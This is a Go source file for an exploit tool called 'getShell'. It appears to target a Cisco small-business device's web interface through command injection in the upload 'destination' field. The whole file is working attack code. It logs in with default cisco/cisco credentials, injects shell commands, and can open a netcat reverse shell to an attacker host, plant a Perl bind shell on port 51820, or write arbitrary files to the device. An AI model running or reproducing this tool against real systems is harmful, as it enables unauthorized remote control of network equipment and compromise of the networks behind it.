package main

import (
	"bytes"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

const (
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; FA2000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
	bindScript = "perl -e 'use POSIX;use Socket;" +
		"fork&&exit;setsid();" +
		"$p=51820;" +
		"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" +
		"setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);" +
		"bind(S,sockaddr_in($p,INADDR_ANY));" +
		"listen(S,SOMAXCONN);" +
		"for(;accept(C,S);close C){" +
		"fork&&next;" +
		"open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");" +
		"exec(\"/bin/sh -i\");}'\n"
	bindPayload     = "chmod 777 /tmp/www/init.sh; /bin/sh /tmp/www/init.sh"
	bindUploadMD5   = "cd6ff97824ab669d4f560247eec653a5"
	outputRetries   = 8
	outputRetryWait = 250 * time.Millisecond
)

type config struct {
	help           bool
	target         string
	user           string
	password       string
	lhost          string
	lport          int
	bindMode       bool
	reverseMode    bool
	command        string
	inline         bool
	seqNum         int
	putRawLocal    string
	putRawRemote   string
	chunkSize      int
}

type shellClient struct {
	target   string
	baseURL  string
	username string
	password string
	payload  string
	cfg      config
	http     *http.Client
}

func main() {
	cfg, err := parseArgs(os.Args[1:])
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %v\n\n", err)
		printUsage()
		os.Exit(1)
	}
	if cfg.help {
		printUsage()
		return
	}

	if !cfg.bindMode && !cfg.reverseMode && cfg.command == "" && cfg.putRawLocal == "" {
		fmt.Fprintln(os.Stderr, "[!] Specify mode: -B (bind), -R (reverse), -c <cmd>, or --put-raw LOCAL REMOTE")
		os.Exit(1)
	}

	client := &shellClient{
		target:   cfg.target,
		baseURL:  "https://" + cfg.target,
		username: cfg.user,
		password: cfg.password,
		cfg:      cfg,
		payload:  buildPayload(cfg),
		http: newHTTPClient(0),
	}

	if err := client.checkReachable(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	if cfg.bindMode && cfg.command == "" {
		if err := client.uploadBindScript(); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
	}

	sessionID, err := client.login()
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	if cfg.putRawLocal != "" {
		if err := client.putRaw(sessionID); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		return
	}

	if _, err := client.exploit(sessionID, client.payload, false); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	switch {
	case cfg.command != "" && !cfg.inline:
		client.readOutput(sessionID)
	case cfg.command != "":
		fmt.Printf("\n[+] Command sent: %s\n", cfg.command)
	case cfg.bindMode:
		fmt.Printf("\n[*] Connect: nc %s 51820\n", cfg.target)
	}
}

func buildPayload(cfg config) string {
	switch {
	case cfg.putRawLocal != "":
		return ""
	case cfg.command != "":
		if cfg.inline {
			return cfg.command
		}
		// Wrap in a subshell so user redirects (>, >>) are not stolen by
		// the tool's own capture to /tmp/download/out.txt.
		return "(" + cfg.command + ") > /tmp/download/out.txt 2>&1"
	case cfg.bindMode:
		return bindPayload
	default:
		return fmt.Sprintf("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | busybox nc %s %d > /tmp/f", cfg.lhost, cfg.lport)
	}
}

func parseArgs(args []string) (config, error) {
	cfg := config{
		target:    "192.168.1.2",
		user:      "cisco",
		password:  "cisco",
		lhost:     "192.168.0.1",
		lport:     61304,
		seqNum:    1,
		chunkSize: 512,
	}

	for i := 0; i < len(args); i++ {
		arg := args[i]
		switch {
		case isHelpArg(arg):
			cfg.help = true
			return cfg, nil
		case arg == "-t":
			i++
			if i >= len(args) {
				return cfg, errors.New("-t requires a target IP or host")
			}
			cfg.target = args[i]
		case strings.HasPrefix(arg, "-t="):
			cfg.target = strings.TrimPrefix(arg, "-t=")
			if cfg.target == "" {
				return cfg, errors.New("-t requires a target IP or host")
			}
		case arg == "-u":
			i++
			if i >= len(args) {
				return cfg, errors.New("-u requires a username")
			}
			cfg.user = args[i]
		case strings.HasPrefix(arg, "-u="):
			cfg.user = strings.TrimPrefix(arg, "-u=")
		case arg == "-p":
			i++
			if i >= len(args) {
				return cfg, errors.New("-p requires a password")
			}
			cfg.password = args[i]
		case strings.HasPrefix(arg, "-p="):
			cfg.password = strings.TrimPrefix(arg, "-p=")
		case arg == "-L":
			i++
			if i >= len(args) {
				return cfg, errors.New("-L requires an LHOST")
			}
			cfg.lhost = args[i]
		case strings.HasPrefix(arg, "-L="):
			cfg.lhost = strings.TrimPrefix(arg, "-L=")
		case arg == "-P":
			i++
			if i >= len(args) {
				return cfg, errors.New("-P requires an LPORT")
			}
			port, err := strconv.Atoi(args[i])
			if err != nil {
				return cfg, fmt.Errorf("invalid -P value: %w", err)
			}
			cfg.lport = port
		case strings.HasPrefix(arg, "-P="):
			port, err := strconv.Atoi(strings.TrimPrefix(arg, "-P="))
			if err != nil {
				return cfg, fmt.Errorf("invalid -P value: %w", err)
			}
			cfg.lport = port
		case arg == "-c":
			i++
			if i >= len(args) {
				return cfg, errors.New("-c requires a command")
			}
			cfg.command = args[i]
		case strings.HasPrefix(arg, "-c="):
			cfg.command = strings.TrimPrefix(arg, "-c=")
		case arg == "-n":
			i++
			if i >= len(args) {
				return cfg, errors.New("-n requires a sequence number")
			}
			seq, err := strconv.Atoi(args[i])
			if err != nil {
				return cfg, fmt.Errorf("invalid -n value: %w", err)
			}
			cfg.seqNum = seq
		case strings.HasPrefix(arg, "-n="):
			seq, err := strconv.Atoi(strings.TrimPrefix(arg, "-n="))
			if err != nil {
				return cfg, fmt.Errorf("invalid -n value: %w", err)
			}
			cfg.seqNum = seq
		case arg == "--put-raw":
			i++
			if i+1 >= len(args) {
				return cfg, errors.New("--put-raw requires LOCAL and REMOTE paths")
			}
			cfg.putRawLocal = args[i]
			cfg.putRawRemote = args[i+1]
			i++
		case strings.HasPrefix(arg, "--put-raw="):
			parts := strings.SplitN(strings.TrimPrefix(arg, "--put-raw="), ",", 2)
			if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
				return cfg, errors.New("--put-raw requires LOCAL and REMOTE paths")
			}
			cfg.putRawLocal = parts[0]
			cfg.putRawRemote = parts[1]
		case arg == "--chunk-size":
			i++
			if i >= len(args) {
				return cfg, errors.New("--chunk-size requires a byte size")
			}
			size, err := strconv.Atoi(args[i])
			if err != nil {
				return cfg, fmt.Errorf("invalid --chunk-size value: %w", err)
			}
			cfg.chunkSize = size
		case strings.HasPrefix(arg, "--chunk-size="):
			size, err := strconv.Atoi(strings.TrimPrefix(arg, "--chunk-size="))
			if err != nil {
				return cfg, fmt.Errorf("invalid --chunk-size value: %w", err)
			}
			cfg.chunkSize = size
		case arg == "-B":
			cfg.bindMode = true
		case arg == "-R":
			cfg.reverseMode = true
		case arg == "--inline":
			cfg.inline = true
		case strings.HasPrefix(arg, "-"):
			return cfg, fmt.Errorf("unknown option: %s", arg)
		default:
			return cfg, fmt.Errorf("unexpected positional argument: %s", arg)
		}
	}

	return cfg, nil
}

func printUsage() {
	fmt.Print(`Authenticated RCE via upload.cgi destination injection.

Usage:
  getShell -t target [-u user] [-p pass] (-B | -R | -c cmd | --put-raw LOCAL REMOTE) [options]

Options:
  -t target              Target IP or host (default: 192.168.1.2)
  -u user                Admin username (default: cisco)
  -p pass                Admin password (default: cisco)
  -L lhost               LHOST for reverse shell (default: 192.168.0.1)
  -P lport               LPORT for reverse shell (default: 61304)
  -B                     Bind shell mode (port 51820)
  -R                     Reverse shell mode
  -c cmd                 Run command; full output via /download/out.txt
  --inline               With -c: print upload HTTP body only
  -n seq                 Upload sequence number (default: 1)
  --put-raw LOCAL REMOTE Write LOCAL to REMOTE via printf chunks
  --chunk-size bytes     Bytes per printf chunk (default: 512)

Examples:
  ./getShell -t 10.0.0.1 -u cisco -p cisco -c 'id'
  ./getShell -t 10.0.0.1 -u cisco -p cisco -B
  ./getShell -t 10.0.0.1 -u cisco -p cisco -R -L 10.10.10.10 -P 4444
  ./getShell -t 10.0.0.1 -u cisco -p cisco --put-raw ./payload /tmp/payload
`)
}

func (c *shellClient) checkReachable() error {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(c.target, "443"), 5*time.Second)
	if err != nil {
		return fmt.Errorf("\n[!] %s:443 unreachable: %v", c.target, err)
	}
	_ = conn.Close()
	fmt.Printf("\n[+] %s:443 is reachable\n", c.target)
	return nil
}

func (c *shellClient) login() (string, error) {
	encodedPass := base64.StdEncoding.EncodeToString([]byte(c.password))
	body := fmt.Sprintf(
		`{"jsonrpc":"2.0","method":"login","params":{"user":"%s","pass":"%s","lang":"English"}}`,
		c.username, encodedPass,
	)

	req, err := http.NewRequest(http.MethodPost, c.baseURL+"/jsonrpc", strings.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Referer", c.baseURL+"/login.html")
	req.Header.Set("Origin", c.baseURL)
	req.Header.Set("User-Agent", userAgent)
	req.AddCookie(&http.Cookie{Name: "selected_language", Value: "English"})

	client := newHTTPClient(10 * time.Second)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	var payload map[string]any
	if err := json.Unmarshal(raw, &payload); err != nil {
		fmt.Printf("[!] Login failed - %v\n%s\n", err, firstN(string(raw), 500))
		return "", errors.New("login failed")
	}

	result := asMap(payload["result"])
	code, _ := result["code"].(float64)
	if int(code) != 0 {
		fmt.Printf("[!] Login failed - non-zero code: %v\n%s\n", result["code"], firstN(string(raw), 500))
		return "", errors.New("login failed")
	}

	sessionID, _ := result["errstr"].(string)
	if sessionID == "" {
		fmt.Printf("[!] Login failed - empty sessionid\n%s\n", firstN(string(raw), 500))
		return "", errors.New("login failed")
	}

	fmt.Printf("\n[+] Logged in\n[*] Sessionid: %s\n", sessionID)
	return sessionID, nil
}

func (c *shellClient) readOutput(sessionID string) bool {
	url := c.baseURL + "/download/out.txt"
	client := newHTTPClient(10 * time.Second)

	for attempt := 1; attempt <= outputRetries; attempt++ {
		req, err := http.NewRequest(http.MethodGet, url, nil)
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return false
		}
		req.AddCookie(&http.Cookie{Name: "sessionid", Value: sessionID})

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return false
		}

		raw, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return false
		}

		text := strings.TrimSpace(string(raw))
		switch resp.StatusCode {
		case http.StatusOK:
			if text != "" {
				fmt.Printf("\n[+] Output:\n\n%s\n", strings.TrimRight(string(raw), "\r\n"))
				_, _ = client.Do(mustRequest(http.MethodGet, url, sessionID))
				return true
			}
		case http.StatusForbidden:
			fmt.Println("[!] 403 - session not accepted by download endpoint")
			return false
		case http.StatusNotFound:
			if attempt < outputRetries {
				time.Sleep(outputRetryWait)
				continue
			}
			fmt.Println("[!] 404 - command output not written (try --inline or retry)")
			return false
		default:
			fmt.Printf("[!] Unexpected %d\n%s\n", resp.StatusCode, firstN(string(raw), 300))
			return false
		}
	}

	fmt.Println("[!] Timed out waiting for command output")
	return false
}

func (c *shellClient) exploit(sessionID, payload string, quiet bool) (*http.Response, error) {
	if !quiet {
		fmt.Println("[*] Exploiting...")
	}

	fields := map[string]string{
		"filename":    "hello.img",
		"pathparam":   "test",
		"fileparam":   "test",
		"option":      "none",
		"destination": fmt.Sprintf("active'; %s; echo '", payload),
	}

	body, contentType, err := buildMultipart(fields, "file", "x", []byte("x"), "application/octet-stream")
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest(http.MethodPost, c.baseURL+"/upload", body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Referer", c.baseURL+"/index.html")
	req.Header.Set("Origin", c.baseURL)
	req.Header.Set("User-Agent", userAgent)
	req.AddCookie(&http.Cookie{Name: "sessionid", Value: sessionID})
	req.AddCookie(&http.Cookie{Name: "user", Value: c.username})
	req.AddCookie(&http.Cookie{Name: "group", Value: "admin"})

	client := newHTTPClient(8 * time.Second)
	resp, err := client.Do(req)
	if err != nil {
		if isTimeout(err) {
			if !quiet {
				fmt.Println("\n[+] \033[91mBoom Headshot\033[0m")
			}
			return nil, nil
		}
		return nil, err
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return resp, err
	}

	if !quiet {
		fmt.Printf("\n[*] Status: %d", resp.StatusCode)
		text := string(raw)
		switch {
		case c.cfg.inline && c.cfg.command != "":
			fmt.Print(text)
		case c.cfg.command == "" && text != "":
			fmt.Print(text)
		}
	}

	return resp, nil
}

func (c *shellClient) uploadBindScript() error {
	fmt.Println("[*] Uploading bind script ...")
	content := []byte(bindScript)
	uploadURL := c.baseURL + "/api/operations/ciscosb-file:form-file-upload"
	triggerURL := c.baseURL + "/form-file-upload"

	fields := map[string]string{
		"pathparam": "Portal",
		"fileparam": "init.sh",
	}
	body, contentType, err := buildMultipart(fields, "file", "init.sh", content, "application/octet-stream")
	if err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, uploadURL, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Authorization", "1")

	client := newHTTPClient(15 * time.Second)
	resp, err := client.Do(req)
	if err != nil && !isTimeout(err) {
		return err
	}
	if resp != nil {
		resp.Body.Close()
	}

	triggered := false
	for n := c.cfg.seqNum; n < c.cfg.seqNum+20; n++ {
		fp := fmt.Sprintf("/tmp/upload/%010d", n)
		fields := map[string]string{
			"pathparam":         "Portal",
			"fileparam":         "init.sh",
			"file.path":         fp,
			"file.name":         "init.sh",
			"file.content_type": "application/octet-stream",
			"file.md5":          bindUploadMD5,
			"file.size":         strconv.Itoa(len(content)),
		}

		body, contentType, err := buildMultipartFieldsOnly(fields)
		if err != nil {
			return err
		}

		req, err := http.NewRequest(http.MethodPost, triggerURL, body)
		if err != nil {
			return err
		}
		req.Header.Set("Content-Type", contentType)

		resp, err := client.Do(req)
		if err != nil {
			if isTimeout(err) {
				fmt.Printf("[+] Trigger hit at sequence %d (timeout)\n", n)
				triggered = true
				break
			}
			return err
		}

		status := resp.StatusCode
		_, _ = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if status == http.StatusOK || status == http.StatusFound || status == 502 {
			fmt.Printf("[+] Trigger hit at sequence %d\n", n)
			triggered = true
			break
		}
	}

	if !triggered {
		return errors.New("[!] Upload trigger failed - try adjusting sequence with -n")
	}
	return nil
}

func (c *shellClient) putRaw(sessionID string) error {
	if c.cfg.chunkSize < 1 {
		return errors.New("[!] --chunk-size must be positive")
	}

	content, err := os.ReadFile(c.cfg.putRawLocal)
	if err != nil {
		return err
	}

	remoteQ := shellQuote(c.cfg.putRawRemote)
	expectedSize := len(content)
	expectedMD5 := fmt.Sprintf("%x", md5.Sum(content))
	totalChunks := (expectedSize + c.cfg.chunkSize - 1) / c.cfg.chunkSize

	fmt.Printf("[*] Local file : %s (%d bytes)\n", c.cfg.putRawLocal, expectedSize)
	fmt.Printf("[*] Remote file: %s\n", c.cfg.putRawRemote)
	fmt.Printf("[*] MD5        : %s\n", expectedMD5)
	fmt.Printf("[*] Chunks     : %d x %d bytes\n", totalChunks, c.cfg.chunkSize)

	if _, err := c.exploit(sessionID, fmt.Sprintf("rm -f %s; : > %s", remoteQ, remoteQ), true); err != nil {
		return err
	}

	for idx := 0; idx < totalChunks; idx++ {
		start := idx * c.cfg.chunkSize
		end := start + c.cfg.chunkSize
		if end > expectedSize {
			end = expectedSize
		}
		chunk := content[start:end]
		escaped := octalPrintf(chunk)
		if _, err := c.exploit(sessionID, fmt.Sprintf("printf %s >> %s", escaped, remoteQ), true); err != nil {
			return err
		}
		done := start + len(chunk)
		fmt.Printf("\r[*] Wrote %d/%d bytes (%d/%d)", done, expectedSize, idx+1, totalChunks)
	}
	fmt.Println()

	if _, err := c.exploit(sessionID, fmt.Sprintf("chmod 666 %s", remoteQ), true); err != nil {
		return err
	}

	verifyCmd := fmt.Sprintf("wc -c < %s; md5sum %s 2>&1", remoteQ, remoteQ)
	if _, err := c.exploit(sessionID, verifyCmd+" > /tmp/download/out.txt 2>&1", true); err != nil {
		return err
	}

	c.readOutput(sessionID)
	return nil
}

func buildMultipart(fields map[string]string, fileField, fileName string, fileContent []byte, fileMIME string) (io.Reader, string, error) {
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)

	for key, value := range fields {
		if err := w.WriteField(key, value); err != nil {
			return nil, "", err
		}
	}

	if fileField != "" {
		part, err := w.CreateFormFile(fileField, fileName)
		if err != nil {
			return nil, "", err
		}
		if _, err := part.Write(fileContent); err != nil {
			return nil, "", err
		}
	}

	if err := w.Close(); err != nil {
		return nil, "", err
	}
	return bytes.NewReader(buf.Bytes()), w.FormDataContentType(), nil
}

func buildMultipartFieldsOnly(fields map[string]string) (io.Reader, string, error) {
	return buildMultipart(fields, "", "", nil, "")
}

func octalPrintf(data []byte) string {
	var b strings.Builder
	for _, byt := range data {
		fmt.Fprintf(&b, "\\%03o", byt)
	}
	return b.String()
}

func shellQuote(s string) string {
	if s == "" {
		return "''"
	}
	return "'" + strings.ReplaceAll(s, "'", "'\"'\"'") + "'"
}

func newHTTPClient(timeout time.Duration) *http.Client {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	if timeout > 0 {
		client.Timeout = timeout
	}
	return client
}

func mustRequest(method, url, sessionID string) *http.Request {
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		panic(err)
	}
	req.AddCookie(&http.Cookie{Name: "sessionid", Value: sessionID})
	return req
}

func isHelpArg(arg string) bool {
	return arg == "-h" || arg == "--help" || arg == "help"
}

func isTimeout(err error) bool {
	var netErr net.Error
	return errors.As(err, &netErr) && netErr.Timeout()
}

func asMap(v any) map[string]any {
	if m, ok := v.(map[string]any); ok {
		return m
	}
	return map[string]any{}
}

func firstN(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
